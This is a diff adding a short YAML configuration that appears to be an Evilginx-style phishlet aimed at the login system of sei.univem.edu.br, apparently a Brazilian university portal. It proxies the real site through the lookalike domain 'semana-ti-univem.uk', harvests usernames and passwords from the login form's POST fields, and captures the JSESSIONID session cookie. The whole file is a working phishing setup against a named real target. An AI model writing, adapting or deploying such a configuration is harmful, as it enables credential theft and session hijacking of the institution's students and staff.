@@ -1,0 +1,20 @@
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: 'sei', orig_sub: 'sei', domain: 'univem.edu.br', session: true, is_landing: true, auto_filter: true}
+sub_filters:
+  - {triggers_on: 'univem.edu.br', orig_sub: 'sei', domain: 'univem.edu.br', search: 'semana-ti-univem.uk', replace: 'univem.edu.br', mimes: ['text/html']}
+auth_tokens:
+  - domain: 'sei.univem.edu.br'
+    keys: ['JSESSIONID']
+credentials:
+  username:
+    key: 'form:usuario'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'form:senha'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'sei.univem.edu.br'
+  path: '/index.xhtml'
